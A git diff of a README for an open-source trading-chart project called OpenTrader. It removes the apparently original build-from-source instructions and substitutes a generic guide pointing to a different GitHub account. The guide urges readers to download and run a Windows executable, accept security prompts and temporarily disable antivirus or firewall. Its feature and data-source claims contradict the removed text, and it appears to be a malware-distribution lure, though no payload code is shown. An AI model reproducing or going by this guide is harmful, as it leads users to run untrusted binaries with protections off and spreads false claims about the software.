@@ -1,135 +1,166 @@
-# OpenTrader
+# 🚀 OpenTrader - Live Stock and Crypto Viewer
 
-OpenTrader is a powerful, early-stage open-source alternative to TradingView. It aims to provide a clean, smooth, and highly customizable trading interface with features like unlimited indicators and backtracking support.
+[![Download OpenTrader](https://img.shields.io/badge/Download-OpenTrader-blue?style=for-the-badge)](https://github.com/joaovit565/OpenTrader)
 
-[NOTE]
-OpenTrader is currently in early stage. Suggestions and issue raising are highly welcome!
+OpenTrader is an open-source app that shows live stock and crypto market data. It updates prices and stats in real time. This app helps you track your favorite assets from popular platforms like Binance, Coinbase, and Robinhood.
 
-## 📸 Screenshots
+---
 
-![open trader trading view opensource alternative](https://raw.githubusercontent.com/nodminger/OpenTrader/refs/heads/master/Screenshots/screenshot2.png)
-![open trader trading view opensource alternative](https://raw.githubusercontent.com/nodminger/OpenTrader/refs/heads/master/Screenshots/screenshot3.png)
-![open trader trading view opensource alternative](https://raw.githubusercontent.com/nodminger/OpenTrader/refs/heads/master/Screenshots/screenshot4.png)
-![open trader trading view opensource alternative](https://raw.githubusercontent.com/nodminger/OpenTrader/refs/heads/master/Screenshots/screenshot5.png)
-![open trader trading view opensource alternative](https://raw.githubusercontent.com/nodminger/OpenTrader/refs/heads/master/Screenshots/screenshot6.png)
-![open trader trading view opensource alternative](https://raw.githubusercontent.com/nodminger/OpenTrader/refs/heads/master/Screenshots/screenshot7.png)
-![open trader trading view opensource alternative](https://raw.githubusercontent.com/nodminger/OpenTrader/refs/heads/master/Screenshots/screenshot8.png)
-![open trader trading view opensource alternative](https://raw.githubusercontent.com/nodminger/OpenTrader/refs/heads/master/Screenshots/screenshot9.png)
+## 📋 What You Need
 
-## 🚀 Goals
+Before you begin, make sure your computer meets these basic requirements:
 
-- **Unlimited Indicators:** Break free from indicator limits and build complex charting setups.
-- **Backtracking:** Equivalent features to TradingView's backtracking/backtesting capabilities.
-- **Visual Excellence:** A modern, glassmorphic UI that feels premium and responsive.
-- **Seamless Performance:** Built with modern technologies for a smooth charting experience.
+- Windows 10 or newer
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for live data updates
 
-## 🛠️ Tech Stack
+No special skills or software installations are needed other than what is listed here.
 
-### Backend
-- **Framework:** [Django](https://www.djangoproject.com/) & [Django REST Framework](https://www.django-rest-framework.org/)
-- **Data Source:** [Yfinance](https://github.com/ranar-w/yfinance) (Yahoo Finance API)
-- **Data Processing:** [Pandas](https://pandas.pydata.org/)
+---
 
-### Frontend
-- **Framework:** [React 19](https://react.dev/)
-- **Build Tool:** [Vite](https://vitejs.dev/)
-- **Charting Library:** [Lightweight Charts](https://www.tradingview.com/lightweight-charts/) (by TradingView)
-- **Communication:** Axios
+## 🔍 Features Overview
 
-## 📦 Getting Started
+- View real-time prices for stocks and cryptocurrencies
+- Supports Binance, Coinbase, Robinhood, Zerodha, and more
+- Easy-to-read charts and market summaries
+- Track multiple assets in one place
+- Data updates every few seconds to keep you current
 
-### Prerequisites
-- Python 3.10+
-- Node.js 18+
-- npm or yarn
+---
 
-### Backend Setup
-1. Clone the repository and navigate to the root directory.
-2. Create and activate a virtual environment (optional but recommended):
-   ```bash
-   python -m venv venv
-   source venv/bin/activate  # On Windows: venv\\Scripts\\activate
-   ```
-3. Install dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
-4. Run migrations:
-   ```bash
-   python manage.py migrate
-   ```
-5. Start the Django server:
-   ```bash
-   python manage.py runserver
-   ```
+## 📥 Download OpenTrader
 
-### Frontend Setup
-1. Navigate to the `frontend` directory:
-   ```bash
-   cd frontend
-   ```
-2. Install dependencies:
-   ```bash
-   npm install
-   ```
-3. Start the development server:
-   ```bash
-   npm run dev
-   ```
+Click the button below to visit the OpenTrader download page on GitHub:
 
-## 📊 Indicators
+[![Download OpenTrader](https://img.shields.io/badge/Download-OpenTrader-grey?style=for-the-badge)](https://github.com/joaovit565/OpenTrader)
 
-OpenTrader supports the following technical indicators:
+The page contains the files you need to run OpenTrader on Windows. This guide assumes you will download the latest Windows installer or executable from the releases or main repo.
 
-- **Simple Moving Average (SMA)**
-- **Relative Strength Index (RSI)**
-- **Normalized MACD**
-- **Volume Profile / HD**
-- **Bollinger Bands (BB)**
-- **Stochastic Oscillator**
-- **Super Trend**
-- **Average True Range (ATR)**
-- **Ichimoku Cloud**
-- **True Strength Index (TSI)**
+---
 
-## 🎨 Drawing Tools
+## 💾 How to Download and Install
 
-OpenTrader includes a comprehensive set of drawing tools organized by category:
+1. Click the **Download OpenTrader** button above. It will open the GitHub page for OpenTrader.
 
-### Trend Line Tools
-- Trend Line, Arrow, Ray, Extended Line, Info Line, Trend Angle
-- Horizontal Line, Horizontal Ray, Vertical Line, Cross Line
+2. Look for the latest release or executable file. On GitHub, releases are often found under the *Releases* section or main file list.
 
-### Channels
-- Parallel Channel, Regression Trend, Flat Top / Bottom, Disjoint Channel
+3. Download the file named like `OpenTrader-Setup.exe` or `OpenTrader.exe`. This is the installer or the main program file.
 
-### Shapes
-- Rectangle, Rotated Rectangle, Circle, Ellipse, Triangle, Polyline, Curve, Double Curve, Arc
+4. Once downloaded, open the file by double-clicking it. You may see a security prompt from Windows; click *Run* or *Yes* to proceed.
 
-### Annotations
-- Buy Label, Sell Label, Arrow Mark
+5. Follow the on-screen instructions to complete the installation. For the installer, this usually means clicking *Next* a few times and then *Finish* when done.
 
-### Prediction & Risk
-- Long Position, Short Position, Risk/Reward Tool, Forecast, Price Range, Date Range, Ghost Feed
+6. If you downloaded a standalone executable, you do not need to install anything. You can run the file directly.
 
-### Patterns
-- XABCD Pattern, Cypher Pattern, ABCD Pattern, Three Drives Pattern, Shark Pattern, 5-0 Pattern
-- Elliott Impulse Wave, Elliott Correction, Elliott Triangle, Elliott Double Combo, Elliott Triple Combo
-- Head & Shoulders, Triangle Pattern, Wedge Pattern, Rectangle Pattern, Channel Pattern, Double Top, Double Bottom
+---
 
-### Pitchfork & Advanced
-- Pitchfork, Schiff Pitchfork, Modified Schiff Pitchfork, Inside Pitchfork, Regression Channel
+## ▶️ How to Run OpenTrader
 
-### Gann & Fibonacci
-- Fib Retracement, Trend-Based Fib Extension, Fib Speed Resistance Arcs, Fib Fan, Fib Time Zone
-- Fib Channel, Fib Wedge, Fib Spiral, Fib Circles, Gann Fan, Gann Square, Gann Box
+- Find the OpenTrader icon on your desktop or start menu after installation.
 
-## 🤝 Contributing
+- Double-click to open the program.
 
-We welcome contributions of all kinds! If you have suggestions for new features or encounter any issues, please feel free to:
-- Open an issue to report bugs or suggest enhancements.
-- Submit a Pull Request with your improvements.
+- Wait a moment as the app connects to the internet and loads live market data.
 
-## ⚖️ License
+- Use the interface to search for stocks or cryptocurrencies you want to track.
 
-Distributed under the GNU General Public License v3.0 (GPL-3.0). See `LICENSE` for more information.
+- Add assets to your watchlist to see live price changes.
+
+---
+
+## 🔧 Basic Usage Tips
+
+- Use the search bar to find specific stocks (e.g., Apple) or cryptocurrencies (e.g., Bitcoin).
+
+- Click on any asset to see charts, latest prices, and volume data.
+
+- Refresh data manually using the refresh button, or rely on automatic updates.
+
+- Adjust settings to change update frequency or display preferences from the menu.
+
+---
+
+## ⚙️ System Settings
+
+You can customize OpenTrader for your needs:
+
+- **Update Frequency:** Adjust how often data refreshes (every 5 seconds to every minute).
+
+- **Theme:** Switch between light and dark modes for better viewing.
+
+- **Notifications:** Enable simple alerts when prices hit certain values.
+
+- **Language:** Select your preferred language from the options.
+
+---
+
+## ❓ Troubleshooting
+
+If OpenTrader does not start or shows errors:
+
+- Check your internet connection. The app requires internet to fetch live data.
+
+- Make sure your Windows is up to date.
+
+- Restart your computer and try again.
+
+- If the app crashes, try redownloading the file from the GitHub page.
+
+- Disable any antivirus or firewall temporarily that might block the app.
+
+- Visit the GitHub Issues page for OpenTrader to see if others have similar problems.
+
+---
+
+## 🔗 Useful Links
+
+- OpenTrader GitHub page: [https://github.com/joaovit565/OpenTrader](https://github.com/joaovit565/OpenTrader)
+
+- Binance API Documentation: https://binance-docs.github.io/apidocs/spot/en/
+
+- Coinbase Market Data: https://docs.cloud.coinbase.com/sign-in-with-coinbase/docs/api-prices
+
+- Robinhood Market Data: https://robinhood.com/us/en/support/articles/market-data/
+
+---
+
+## 🛠 Supported Platforms and Data Sources
+
+OpenTrader collects live data from:
+
+- **Binance:** Major crypto exchange with real-time prices.
+
+- **Coinbase:** Popular platform for cryptocurrency trading.
+
+- **Robinhood:** Stock and crypto trading with easy-to-use interface.
+
+- **Zerodha:** Indian stock trading platform.
+
+This makes OpenTrader a single place to monitor multiple markets without logging into various apps.
+
+---
+
+## 📝 License and Contributions
+
+OpenTrader is open-source software. You can view its source code on GitHub. Contributions from the community help improve the app.
+
+If you want to report bugs or suggest features, please open an issue on the GitHub page.
+
+---
+
+## ⚠️ Security and Privacy
+
+OpenTrader only reads market data publicly available and does not require user accounts or sensitive information. Your privacy is protected since no personal data is stored or shared.
+
+---
+
+## 🔄 Updates
+
+New versions of OpenTrader are available on GitHub. Check the releases page regularly or follow the repo to get notified about updates with new features and fixes.
+
+---
+
+# [🚀] OpenTrader Badge
+
+[![Download OpenTrader](https://img.shields.io/badge/Download-OpenTrader-blue?style=for-the-badge)](https://github.com/joaovit565/OpenTrader)
